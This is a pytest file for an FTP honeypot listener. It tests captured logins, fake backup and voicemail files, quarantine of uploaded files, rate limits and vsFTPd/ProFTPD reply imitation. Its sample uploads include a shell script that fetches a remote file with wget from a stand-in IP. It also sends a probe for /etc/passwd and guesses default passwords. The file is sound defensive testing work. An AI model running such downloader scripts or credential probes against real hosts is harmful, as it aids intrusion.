"""FTP trap tests: stdlib ftplib client (in a thread) against the loopback listener."""

from __future__ import annotations

import asyncio
import ftplib
import hashlib
import io
import os
import stat
from typing import Optional

import pytest

from listeners import ftp
from listeners.base import Limits, ListenerContext, ServiceSettings
from listeners.events import EventWriter
from scenarios.loader import LoadedScenario
from scenarios.schema import Scenario, LoginPolicy

SCENARIO = {
    "name": "unit_test", "title": "Unit", "description": "unit test scenario",
    "identity": {"org_name": "Example Org", "hostname": "pbx01", "domain": "example.test",
                 "internal_ips": ["10.0.0.5"], "os_pretty_name": "Debian GNU/Linux 12",
                 "kernel": "Linux pbx01 6.1.0-18-amd64 #1 SMP x86_64 GNU/Linux",
                 "lures": ["/etc/asterisk/sip.conf"]},
    "services": {"ftp": {"enabled": True, "port": 0, "banner": "(vsFTPd 3.0.3)",
                         "retr_max_bytes": 4096,
                         "files": [{"path": "/backups/config-2026-03-01.tar.gz", "size": 48213,
                                    "mtime": "2026-03-01 02:00"},
                                   {"path": "/voicemail/README.txt",
                                    "content": "Voicemail export folder\n"}]}},
}


def make_ctx(tmp_path, accept="after_n", accounts=(), limits: Optional[Limits] = None,
             scenario: bool = True):
    writer = EventWriter(None)
    loaded = LoadedScenario(scenario=Scenario.model_validate(SCENARIO), seed="t") if scenario else None
    ctx = ListenerContext(writer, limits=limits, bind_host="127.0.0.1", seed="test",
                          scenario=loaded, quarantine_dir=str(tmp_path / "quarantine"))
    settings = ServiceSettings(name="ftp", enabled=True, port=0, banner="(vsFTPd 3.0.3)",
                               policy=LoginPolicy(accept=accept, after_n_min=2, after_n_max=2),
                               accounts=list(accounts))
    ctx.settings["ftp"] = settings
    return ctx, settings, writer


@pytest.fixture
async def ftp_server(tmp_path):
    servers = []

    async def _start(**kw):
        ctx, settings, writer = make_ctx(tmp_path, **kw)
        objs = await ftp.start(ctx, settings)
        servers.extend(objs)
        return ctx, writer, objs[0].sockets[0].getsockname()[1]

    yield _start
    for s in servers:
        s.close()


def events(writer, event):
    return [e for e in writer.events if e["event"] == event]


def client_session(port: int, quarantine_cap: int) -> dict:
    out: dict = {}
    f = ftplib.FTP()
    out["welcome"] = f.connect("127.0.0.1", port, timeout=5)
    with pytest.raises(ftplib.error_perm) as exc:
        f.login("admin", "admin")
    out["fail"] = str(exc.value)
    out["login"] = f.login("admin", "Winter2026!")
    out["pwd"] = f.pwd()
    out["root"] = f.nlst()
    out["list"] = []
    f.retrlines("LIST /backups", out["list"].append)
    f.cwd("/voicemail")
    out["readme"] = io.BytesIO()
    f.retrbinary("RETR README.txt", out["readme"].write)
    out["size"] = f.size("/backups/config-2026-03-01.tar.gz")
    out["big"] = io.BytesIO()
    f.retrbinary("RETR /backups/config-2026-03-01.tar.gz", out["big"].write)
    out["stor"] = f.storbinary("STOR shell.sh", io.BytesIO(b"#!/bin/sh\necho pwned\n"))
    out["after"] = f.nlst()
    with pytest.raises(ftplib.error_perm) as exc:
        f.storbinary("STOR big.bin", io.BytesIO(b"x" * (quarantine_cap + 10)))
    out["too_big"] = str(exc.value)
    out["mkd"] = f.mkd("/tmp2")
    out["dele"] = f.delete("/voicemail/README.txt")
    f.set_pasv(False)
    with pytest.raises(ftplib.error_perm) as exc:
        f.nlst()
    out["port"] = str(exc.value)
    out["quit"] = f.quit()
    return out


async def test_ftp_fail_then_login_browse_retr_stor(ftp_server, tmp_path):
    limits = Limits(quarantine_max_file_bytes=1000)
    ctx, writer, port = await ftp_server(limits=limits)
    out = await asyncio.to_thread(client_session, port, 1000)

    assert out["welcome"] == "220 (vsFTPd 3.0.3)"
    assert out["fail"].startswith("530")
    assert out["login"].startswith("230")
    assert out["pwd"] == "/"
    assert set(out["root"]) >= {"backups", "voicemail", "etc"}
    assert "config-2026-03-01.tar.gz" in out["list"][0] and "48213" in out["list"][0]
    assert out["readme"].getvalue() == b"Voicemail export folder\n"
    assert out["size"] == 48213
    assert len(out["big"].getvalue()) == 4096              # capped by retr_max_bytes
    assert out["stor"].startswith("226")
    assert "shell.sh" in out["after"]
    assert out["too_big"].startswith("552")
    assert out["port"] == "500 Illegal PORT command."
    assert out["quit"].startswith("221")

    attempts = events(writer, "auth_attempt")
    assert [(a["username"], a["password"], a["success"]) for a in attempts] == [
        ("admin", "admin", False), ("admin", "Winter2026!", True)]

    payload = b"#!/bin/sh\necho pwned\n"
    qfiles = {p.read_bytes(): p for p in (tmp_path / "quarantine").glob("*.bin")}  # .json aside
    assert set(qfiles) == {payload, b"x" * 1000}            # the oversized one cut at the cap
    assert stat.S_IMODE(os.stat(qfiles[payload]).st_mode) == 0o600
    uploads = [e for e in events(writer, "command") if e["data"].get("signal") == "ftp_upload"]
    ok = next(u for u in uploads if u["data"].get("filename") == "shell.sh")
    assert ok["data"]["stored"] is True and not ok["data"].get("truncated")
    assert ok["data"]["sha256"] == hashlib.sha256(payload).hexdigest()
    assert ok["data"]["size"] == len(payload)
    assert ok["data"]["quarantine_name"] == qfiles[payload].name
    cut = next(u for u in uploads if u["data"].get("filename") == "big.bin")
    assert cut["data"]["stored"] is True and cut["data"]["truncated"] is True
    assert cut["data"]["reason"] == "quarantine_max_file_bytes" and cut["data"]["size"] == 1000
    cmds = [e["data"].get("cmd") for e in events(writer, "command")]
    assert "PASV" in cmds or "EPSV" in cmds


async def test_ftp_without_scenario_and_pre_login_gate(ftp_server):
    ctx, writer, port = await ftp_server(scenario=False, accept="none")

    def run():
        f = ftplib.FTP()
        f.connect("127.0.0.1", port, timeout=5)
        res = {"syst": f.sendcmd("SYST")}
        try:
            f.sendcmd("PWD")
        except ftplib.error_perm as exc:
            res["pwd"] = str(exc)
        try:
            f.login("root", "toor")
        except ftplib.error_perm as exc:
            res["login"] = str(exc)
        f.close()
        return res

    res = await asyncio.to_thread(run)
    assert res["syst"].startswith("215")
    assert res["pwd"].startswith("530")
    assert res["login"].startswith("530")
    assert events(writer, "auth_attempt")[0]["success"] is False


async def test_ftp_per_ip_connection_rate_limit(ftp_server):
    ctx, writer, port = await ftp_server(limits=Limits(rate_per_ip_per_minute=2))
    banners = []
    for _ in range(3):
        reader, w = await asyncio.open_connection("127.0.0.1", port)
        banners.append(await asyncio.wait_for(reader.read(100), 2))
        w.close()
    assert banners[0].startswith(b"220") and banners[1].startswith(b"220")
    assert banners[2] == b""
    assert any(e["data"].get("reason") == "rate_per_ip_per_minute" for e in events(writer, "limit"))


async def test_passive_listener_times_out_without_data_connection(ftp_server):
    ctx, writer, port = await ftp_server(accept="all")
    ctx.limits.read_timeout = 0.5
    reader, w = await asyncio.open_connection("127.0.0.1", port)

    async def cmd(line: str) -> bytes:
        w.write(line.encode() + b"\r\n")
        await w.drain()
        return await asyncio.wait_for(reader.readline(), 3)

    await reader.readline()
    await cmd("USER a")
    assert (await cmd("PASS b")).startswith(b"230")
    resp = await cmd("EPSV")
    assert resp.startswith(b"229")
    # No data connection is made, so LIST gives up with 425 after the timeout.
    assert (await cmd("LIST")).startswith(b"425")
    w.close()


async def test_unused_passive_listener_closes_after_accept_timeout(ftp_server):
    ctx, writer, port = await ftp_server(accept="all")
    ctx.limits.ftp_pasv_accept_timeout = 0.2
    c = await Ctl.login(port)
    _, dport = await c.pasv()
    await asyncio.sleep(0.5)
    with pytest.raises(OSError):
        await asyncio.wait_for(asyncio.open_connection("127.0.0.1", dport), 2)
    assert (await c.cmd("LIST")).startswith("425")
    assert (await c.cmd("NOOP")).startswith("200")


async def test_pending_passive_listeners_are_limited_per_source(ftp_server):
    ctx, writer, port = await ftp_server(accept="all")
    ctx.limits.ftp_pasv_per_ip = 1
    a, b = await Ctl.login(port), await Ctl.login(port)
    await a.pasv()
    assert (await b.cmd("PASV")).startswith("425")
    await a.pasv()                                   # replacing its own listener is allowed
    assert any(e["data"].get("reason") == "ftp_pasv_per_ip" for e in events(writer, "limit"))
    first, final = await a.stor("x.sh", b"#!/bin/sh\n")  # the slot frees once accepted
    assert final.startswith("226")
    await b.pasv()


async def test_mkd_parents_respect_the_entry_cap_and_depth_limit(ftp_server):
    ctx, writer, port = await ftp_server(accept="all")
    c = await Ctl.login(port)
    deep = "/".join(["a"] * 1500)
    assert (await c.cmd(f"MKD {deep}")).startswith("550")
    assert (await c.cmd("CWD /a/a/a")).startswith("550")
    near = "/".join(["b"] * ftp.MAX_PATH_DEPTH)
    assert (await c.cmd(f"MKD /{near}")).startswith("257")
    replies = [await c.cmd(f"MKD /c{i}/d/e/f") for i in range(200)]
    assert replies[0].startswith("257") and replies[-1].startswith("550")


def test_tree_add_file_respects_the_entry_cap_and_depth_limit():
    tree = ftp.Tree({})
    entry = ftp.Entry(b"x", 1, ftp.DEFAULT_MTIME)
    assert not tree.add_file("/" + "/".join(["a"] * 1500) + "/f", entry)
    assert tree.dirs == {"/"} and tree.files == {}
    added = sum(tree.add_file(f"/d{i}/e/f/file", entry) for i in range(400))
    assert 0 < added < 400
    assert len(tree.files) + len(tree.dirs) <= ftp.MAX_SESSION_ENTRIES


class Ctl:
    """Minimal raw FTP control client for tests that need byte-level control."""

    def __init__(self, reader, writer) -> None:
        self.reader, self.writer = reader, writer

    @classmethod
    async def login(cls, port: int) -> "Ctl":
        reader, writer = await asyncio.open_connection("127.0.0.1", port)
        c = cls(reader, writer)
        await c.line()
        await c.cmd("USER a")
        assert (await c.cmd("PASS b")).startswith("230")
        return c

    async def line(self) -> str:
        return (await asyncio.wait_for(self.reader.readline(), 5)).decode().rstrip("\r\n")

    async def cmd(self, text: str) -> str:
        self.writer.write(text.encode() + b"\r\n")
        await self.writer.drain()
        return await self.line()

    async def pasv(self) -> tuple[str, int]:
        resp = await self.cmd("PASV")
        assert resp.startswith("227"), resp
        nums = [int(x) for x in resp[resp.index("(") + 1:resp.index(")")].split(",")]
        return ".".join(map(str, nums[:4])), nums[4] * 256 + nums[5]

    async def stor(self, name: str, payload: bytes, pause_after: Optional[int] = None,
                   during=None) -> tuple[str, str]:
        _, dport = await self.pasv()
        dr, dw = await asyncio.open_connection("127.0.0.1", dport)
        self.writer.write(f"STOR {name}\r\n".encode())
        await self.writer.drain()
        first = await self.line()
        try:
            if pause_after is not None:
                dw.write(payload[:pause_after])
                await dw.drain()
                await asyncio.sleep(0.2)
                if during is not None:
                    during()
                payload = payload[pause_after:]
            dw.write(payload)
            await dw.drain()
        except ConnectionError:
            pass
        dw.close()
        return first, await self.line()

    async def retr(self, name: str) -> tuple[str, bytes, str]:
        _, dport = await self.pasv()
        dr, dw = await asyncio.open_connection("127.0.0.1", dport)
        first = await self.cmd(f"RETR {name}")
        data = await asyncio.wait_for(dr.read(), 5)
        dw.close()
        return first, data, await self.line()


def uploads_of(writer) -> list[dict]:
    return [e["data"] for e in events(writer, "command") if e["data"].get("signal") == "ftp_upload"]


async def test_stor_streams_to_disk_while_reading(ftp_server, tmp_path):
    ctx, writer, port = await ftp_server(accept="all", limits=Limits(max_conn_bytes=4_000_000))
    c = await Ctl.login(port)
    payload = os.urandom(600_000)
    seen: dict = {}

    def look() -> None:
        parts = list((tmp_path / "quarantine").glob(".part-*"))
        seen["partial"] = sum(p.stat().st_size for p in parts)

    first, final = await c.stor("dropper.bin", payload, pause_after=300_000, during=look)
    assert first.startswith("150") and final.startswith("226")
    assert seen["partial"] >= 200_000          # on disk before the upload finished
    stored = [p for p in (tmp_path / "quarantine").glob("*.bin")]
    assert len(stored) == 1 and stored[0].read_bytes() == payload


async def test_stor_bytes_limited_by_quarantine_caps_not_connection_cap(ftp_server, tmp_path):
    ctx, writer, port = await ftp_server(accept="all", limits=Limits(max_conn_bytes=200_000))
    c = await Ctl.login(port)
    payload = os.urandom(300_000)
    first, final = await c.stor("big.bin", payload)
    assert first.startswith("150") and final.startswith("226")
    assert (await c.cmd("NOOP")).startswith("200")             # control connection still open
    stored = list((tmp_path / "quarantine").glob("*.bin"))
    assert len(stored) == 1 and stored[0].read_bytes() == payload
    assert not any(e["data"].get("reason") == "max_conn_bytes" for e in events(writer, "limit"))


async def test_stor_over_file_cap_is_truncated_stored_and_logged(ftp_server, tmp_path):
    limits = Limits(quarantine_max_file_bytes=100_000)
    ctx, writer, port = await ftp_server(accept="all", limits=limits)
    c = await Ctl.login(port)
    payload = os.urandom(300_000)
    first, final = await c.stor("dropper.bin", payload)
    assert first.startswith("150") and final.startswith("552")
    stored = list((tmp_path / "quarantine").glob("*.bin"))
    assert len(stored) == 1 and stored[0].read_bytes() == payload[:100_000]
    up = uploads_of(writer)[-1]
    assert up["stored"] is True and up["truncated"] is True
    assert up["size"] == 100_000
    assert up["sha256"] == hashlib.sha256(payload[:100_000]).hexdigest()
    assert up["reason"] == "quarantine_max_file_bytes"
    assert (await c.cmd("NOOP")).startswith("200")


async def test_stor_over_per_source_quota_stops_reading(ftp_server, tmp_path):
    limits = Limits(quarantine_max_file_bytes=100_000, quarantine_per_ip_bytes=150_000)
    ctx, writer, port = await ftp_server(accept="all", limits=limits)
    c = await Ctl.login(port)
    assert (await c.stor("a.bin", os.urandom(90_000)))[1].startswith("226")
    first, final = await c.stor("b.bin", os.urandom(400_000))
    assert first.startswith("150") and final.startswith("552")
    assert len(list((tmp_path / "quarantine").glob("*.bin"))) == 1
    assert uploads_of(writer)[-1]["reason"] == "quarantine_per_ip_bytes"
    assert (await c.cmd("NOOP")).startswith("200")


async def test_stor_duplicate_logged_not_stored_twice(ftp_server, tmp_path):
    ctx, writer, port = await ftp_server(accept="all")
    c = await Ctl.login(port)
    payload = b"#!/bin/sh\nwget http://198.51.100.7/x\n"
    assert (await c.stor("a.sh", payload))[1].startswith("226")
    assert (await c.stor("b.sh", payload))[1].startswith("226")
    assert len(list((tmp_path / "quarantine").glob("*.bin"))) == 1
    ups = uploads_of(writer)
    assert ups[0]["stored"] is True and not ups[0].get("duplicate")
    assert ups[1]["stored"] is False and ups[1]["duplicate"] is True
    assert ups[1]["quarantine_name"] == ups[0]["quarantine_name"]
    assert ups[1]["sha256"] == hashlib.sha256(payload).hexdigest()


async def test_stor_quota_hit_is_high_signal(ftp_server, tmp_path):
    ctx, writer, port = await ftp_server(accept="all", limits=Limits(quarantine_per_ip_bytes=100))
    c = await Ctl.login(port)
    assert (await c.stor("one", b"1" * 80))[1].startswith("226")
    assert (await c.stor("two", b"2" * 80))[1].startswith("552")
    assert (await c.stor("three", b"3" * 30))[1].startswith("552")
    assert len(list((tmp_path / "quarantine").glob("*.bin"))) == 1
    ups = uploads_of(writer)
    assert ups[1]["stored"] is False and ups[1]["reason"] == "quarantine_per_ip_bytes"
    assert "sha256" not in ups[1]                  # reading stopped at the quota
    quota = [e for e in writer.events if e["data"].get("signal") == "quarantine_quota"]
    assert len(quota) == 1 and quota[0]["data"]["high_signal"] is True   # repeat aggregated
    assert quota[0]["data"]["reason"] == "ip_quota"


async def test_retr_of_uploaded_file(ftp_server):
    ctx, writer, port = await ftp_server(accept="all")       # scenario retr_max_bytes = 4096
    c = await Ctl.login(port)
    small = os.urandom(5000)
    assert (await c.stor("small.bin", small))[1].startswith("226")
    _, got, done = await c.retr("small.bin")
    assert got == small and done.startswith("226")
    big = os.urandom(100_000)                                # over the in-memory copy cap
    assert (await c.stor("big.bin", big))[1].startswith("226")
    assert await c.cmd("SIZE big.bin") == "213 100000"
    _, got1, _ = await c.retr("big.bin")
    _, got2, _ = await c.retr("big.bin")
    assert len(got1) == 100_000 and got1 == got2


def test_generate_content_is_linear():
    import time
    ctx = ListenerContext(EventWriter(None), seed="s")
    started = time.monotonic()
    out = ftp.generate_content(ctx, "/backups/db.sql", 2_000_000)
    assert len(out) == 2_000_000
    assert time.monotonic() - started < 1.0
    assert ftp.generate_content(ctx, "/backups/db.sql", 1000) == out[:1000]


async def test_feat_does_not_advertise_refused_eprt(ftp_server):
    ctx, writer, port = await ftp_server(accept="all")
    reader, w = await asyncio.open_connection("127.0.0.1", port)
    await reader.readline()
    w.write(b"FEAT\r\n")
    await w.drain()
    feat = b""
    while not feat.endswith(b"211 End\r\n"):
        feat += await asyncio.wait_for(reader.read(4096), 3)
    assert b"EPSV" in feat and b"EPRT" not in feat
    w.close()


def _free_port_block(n: int) -> int:
    import socket
    for base in range(41000, 60000, 37):
        socks = []
        try:
            for p in range(base, base + n):
                s = socket.socket()
                s.bind(("127.0.0.1", p))
                socks.append(s)
            return base
        except OSError:
            continue
        finally:
            for s in socks:
                s.close()
    raise RuntimeError("no free port block")


async def test_pasv_port_range_and_advertised_address(ftp_server):
    import socket
    ctx, writer, port = await ftp_server(accept="all")
    base = _free_port_block(3)
    ctx.ftp_pasv_ports = (base, base + 2)
    blocker = socket.socket()
    blocker.bind(("127.0.0.1", base))                         # first port of the range busy
    blocker.listen()
    try:
        c = await Ctl.login(port)
        host, dport = await c.pasv()
        assert host == "127.0.0.1"                            # control connection's local address
        assert dport == base + 1
        await c.cmd("ABOR")
        ctx.ftp_pasv_address = "203.0.113.7"
        host, dport = await c.pasv()
        assert host == "203.0.113.7" and base <= dport <= base + 2
        epsv = await c.cmd("EPSV")
        assert epsv.startswith("229") and base <= int(epsv.split("|||")[1].rstrip("|)")) <= base + 2
    finally:
        blocker.close()


async def test_pasv_listener_never_binds_outside_range(ftp_server):
    import socket
    ctx, writer, port = await ftp_server(accept="all")
    base = _free_port_block(1)
    ctx.ftp_pasv_ports = (base, base)
    blocker = socket.socket()
    blocker.bind(("127.0.0.1", base))
    blocker.listen()
    try:
        c = await Ctl.login(port)
        assert (await c.cmd("PASV")).startswith("425")
        assert (await c.cmd("NOOP")).startswith("200")
    finally:
        blocker.close()


def test_pasv_peer_check():
    assert ftp.same_source("127.0.0.1", "127.0.0.1")
    assert ftp.same_source("::ffff:198.51.100.4", "198.51.100.4")
    assert not ftp.same_source("127.0.0.2", "127.0.0.1")
    assert not ftp.same_source("198.51.100.5", "198.51.100.4")


async def test_pasv_refuses_data_connection_from_other_address(ftp_server):
    import socket
    probe = socket.socket()
    try:
        probe.bind(("127.0.0.2", 0))
    except OSError:
        pytest.skip("127.0.0.2 is not configured on this host (covered by test_pasv_peer_check)")
    finally:
        probe.close()
    ctx, writer, port = await ftp_server(accept="all")
    ctx.limits.read_timeout = 0.5
    c = await Ctl.login(port)
    _, dport = await c.pasv()
    r, w = await asyncio.open_connection("127.0.0.1", dport, local_addr=("127.0.0.2", 0))
    assert await asyncio.wait_for(r.read(), 2) == b""                 # closed on us
    w.close()
    assert (await c.cmd("LIST")).startswith("425")
    assert any(e["data"].get("reason") == "pasv_foreign_peer" for e in events(writer, "limit"))


async def test_numeric_arguments_never_drop_the_connection(ftp_server):
    ctx, writer, port = await ftp_server(accept="all")
    c = await Ctl.login(port)
    for line in ("REST 99999999999999999999999999", "REST -1", "REST " + "9" * 3000,
                 "PORT 999,999,999,999,999,999", "PORT 1,2,3,4,99999999999999999999,1",
                 "EPRT |1|203.0.113.4|99999999999|", "SIZE " + "9" * 3000, "MDTM 99999999999999"):
        assert (await c.cmd(line))[:1] in ("2", "3", "4", "5")
    assert (await c.cmd("NOOP")).startswith("200")
    assert not events(writer, "error")


def test_generated_archives_and_audio_have_real_formats():
    import gzip as _gzip

    from listeners.base import ListenerContext as _Ctx
    from listeners.events import EventWriter as _W
    from listeners.ftp import generate_content

    ctx = _Ctx(_W(None))
    gz = generate_content(ctx, "/backups/nightly/freepbx-backup.tar.gz", 4096)
    assert gz[:2] == b"\x1f\x8b" and len(gz) <= 4096
    assert len(_gzip.decompress(gz)) > 3500                 # a complete, valid stream
    wav = generate_content(ctx, "/voicemail/1001/msg0001.wav", 8000)
    assert wav[:4] == b"RIFF" and wav[8:16] == b"WAVEfmt " and len(wav) == 8000
    assert generate_content(ctx, "/backups/notes.txt", 200).startswith(b"# notes.txt")


async def test_mlst_and_site_answer_like_the_advertised_server(ftp_server):
    ctx, writer, port = await ftp_server(accept="all")
    c = await Ctl.login(port)
    assert await c.cmd("MLST /backups/config-2026-03-01.tar.gz") == \
        "250-Listing /backups/config-2026-03-01.tar.gz"
    assert await c.line() == (" type=file;size=48213;modify=20260301020000;perm=adfrw; "
                              "/backups/config-2026-03-01.tar.gz")
    assert await c.line() == "250 End"
    assert await c.cmd("MLST") == "250-Listing /"
    assert (await c.line()).startswith(" type=dir;size=4096;")
    assert await c.line() == "250 End"
    assert await c.cmd("MLST /nope") == "550 Permission denied."
    assert await c.cmd("SITE HELP") == "214 CHMOD UMASK HELP"
    assert await c.cmd("SITE CHMOD 777 /voicemail/README.txt") == "200 SITE CHMOD command ok."
    assert await c.cmd("SITE CHMOD 777 /nope") == "550 SITE CHMOD command failed."
    assert await c.cmd("SITE CHMOD 777") == "501 SITE CHMOD needs 2 arguments."
    assert await c.cmd("SITE UMASK") == "200 Your current UMASK is 0077"
    assert await c.cmd("SITE UMASK 022") == "200 UMASK set to 0022"
    assert await c.cmd("SITE CPFR /etc/passwd") == "500 Unknown SITE command."
    assert await c.cmd("NOOP") == "200 NOOP ok."


async def test_ftp_vsftpd_help_stat_allo_rmd_and_active_mode(ftp_server):
    ctx, writer, port = await ftp_server(accept="all")
    reader, w = await asyncio.open_connection("127.0.0.1", port)
    pre = Ctl(reader, w)
    await pre.line()
    assert await pre.cmd("HELP") == "530 Please login with USER and PASS."
    w.close()
    c = await Ctl.login(port)
    assert await c.cmd("HELP") == "214-The following commands are recognized."
    body = [await c.line() for _ in range(5)]
    assert body[0] == " ABOR ACCT ALLO APPE CDUP CWD  DELE EPRT EPSV FEAT HELP LIST MDTM MKD"
    assert body[3] == " XPWD XRMD" and body[4] == "214 Help OK."
    assert await c.cmd("STAT") == "211-FTP server status:"
    stat = [await c.line() for _ in range(10)]
    assert stat[0] == "     Connected to 127.0.0.1" and stat[1] == "     Logged in as a"
    assert stat[2] == "     TYPE: ASCII" and stat[8] == "     vsFTPd 3.0.3 - secure, fast, stable"
    assert stat[9] == "211 End of status"
    assert await c.cmd("TYPE I") == "200 Switching to Binary mode."
    assert await c.cmd("STAT") == "211-FTP server status:"
    assert [await c.line() for _ in range(10)][2] == "     TYPE: BINARY"
    assert await c.cmd("ALLO 1024") == "202 ALLO command ignored."
    assert await c.cmd("MKD /tmpdir/sub") == '257 "/tmpdir/sub" created'
    assert await c.cmd("RMD /tmpdir") == "550 Remove directory operation failed."
    assert await c.cmd("RMD /tmpdir/sub") == "250 Remove directory operation successful."
    assert await c.cmd("RMD /tmpdir") == "250 Remove directory operation successful."
    assert await c.cmd("RMD /voicemail") == "550 Remove directory operation failed."
    assert await c.cmd("RMD /nope") == "550 Remove directory operation failed."
    # Active mode stays refused, with vsftpd's reply for each case, and drops a pending PASV.
    assert await c.cmd("PORT 127,0,0,1,31,144") == "500 Illegal PORT command."
    assert await c.cmd("PORT 198,51,100,9,31,144") == "500 Illegal PORT command."
    assert await c.cmd("PORT x") == "500 Illegal PORT command."
    assert await c.cmd("EPRT |1|127.0.0.1|8080|") == "500 Illegal EPRT command."
    assert await c.cmd("EPRT |1|198.51.100.9|8080|") == "500 Illegal EPRT command."
    assert await c.cmd("EPRT |1|bogus|8080|") == "500 Bad EPRT command."
    assert await c.cmd("EPRT #1#127.0.0.1#8080#") == "500 Bad EPRT command."
    assert await c.cmd("EPRT |3|127.0.0.1|8080|") == "500 Bad EPRT protocol."
    assert await c.cmd("EPRT |2|::1|8080|") == "500 Bad EPRT protocol."     # IPv4 socket
    await c.pasv()
    assert await c.cmd("PORT 127,0,0,1,31,144") == "500 Illegal PORT command."
    assert await c.cmd("LIST") == "425 Use PORT or PASV first."
    active = [e for e in events(writer, "command") if e["data"].get("signal") == "ftp_active_mode"]
    assert len(active) == 10


async def test_ftp_proftpd_banner_family(ftp_server):
    ctx, writer, port = await ftp_server(accept="all")
    ctx.settings["ftp"].banner = "220 ProFTPD 1.3.8 Server (Northwind Files) [192.0.2.10]"
    c = await Ctl.login(port)
    assert await c.cmd("HELP") == \
        "214-The following commands are recognized (* =>'s unimplemented):"
    first = await c.line()
    assert first == " CWD     XCWD    CDUP    XCUP    SMNT*   QUIT    PORT    PASV    "
    while not (line := await c.line()).startswith("214 "):
        assert line.startswith(" ")
    assert line.startswith("214 Direct comments to root@")
    assert await c.cmd("STAT") == "211-Status of 'Northwind Files'"
    assert [await c.line() for _ in range(5)] == [
        " Connected from 127.0.0.1 (127.0.0.1)", " Logged in as a",
        " TYPE: ASCII, STRUcture: File, Mode: Stream", " No data connection",
        "211 End of status"]
    assert await c.cmd("ALLO 10") == "202 No storage allocation necessary"
    assert await c.cmd("SITE CHMOD 777 /voicemail/README.txt") == "200 SITE CHMOD command successful"
    assert await c.cmd("SITE CHMOD 777 /nope") == "550 /nope: No such file or directory"
    assert await c.cmd("SITE CPFR /etc/passwd") == "500 'SITE CPFR' not understood"
    assert await c.cmd("RMD /voicemail") == "550 /voicemail: Directory not empty"
    assert await c.cmd("MKD /e") == '257 "/e" created'
    assert await c.cmd("RMD /e") == "250 RMD command successful"
